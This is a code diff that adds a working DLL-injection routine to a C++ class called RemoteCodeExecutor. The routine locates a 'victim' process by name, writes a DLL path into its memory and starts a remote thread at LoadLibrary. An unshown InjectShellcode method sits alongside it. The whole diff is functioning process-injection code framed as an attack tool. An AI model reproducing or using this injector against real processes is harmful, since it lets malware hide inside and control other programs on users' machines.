@@ -11,7 +11,44 @@ public:
     RemoteCodeExecutor operator=(RemoteCodeExecutor&& other) = delete;
 
     static void InjectDLL(std::wstring_view dll_path, std::wstring_view victim_proc_name) {
-        
+        HANDLE hVictim{ 0 };
+        LPVOID allocated_memory{ 0 };
+        HANDLE hThread{ 0 };
+        try {
+            DWORD pid = GetProcessId(victim_proc_name);
+            if (!pid) {
+                throw std::runtime_error("Can't find "
+                    + WideCharToString(victim_proc_name.data())
+                    + " process");
+            }
+
+            hVictim = OpenVictimProcess(pid);
+            size_t bytes_needed = (dll_path.size() + 1) * sizeof(wchar_t);
+            allocated_memory = AllocateMemoryInVictim(hVictim, NULL, bytes_needed);
+            WriteToVictimMemory(hVictim, allocated_memory, dll_path.data(), bytes_needed);
+
+            LPVOID load_library = GetLoadLibraryFunc();
+            hThread = CreateThreadInVictim(hVictim, load_library, allocated_memory);
+            WaitForSingleObject(hThread, 5000);
+            DWORD exit_code{ 0 };
+            GetExitCodeThread(hThread, &exit_code);
+            if (exit_code == 0) {
+                throw std::runtime_error("LoadLibrary failed in victim process");
+            }
+            CloseHandle(hThread);
+            FreeMemoryInVictim(hVictim, allocated_memory);
+        }
+        catch (const std::exception& e) {
+            if (hThread) {
+                CloseHandle(hThread);
+            }
+            FreeMemoryInVictim(hVictim, allocated_memory);
+
+            throw std::runtime_error("Injection to "
+                + WideCharToString(victim_proc_name.data())
+                + " error: "
+                + e.what());
+        }
     }
 
     static void InjectShellcode(const char* shelcode, std::wstring_view victim_proc_name) {
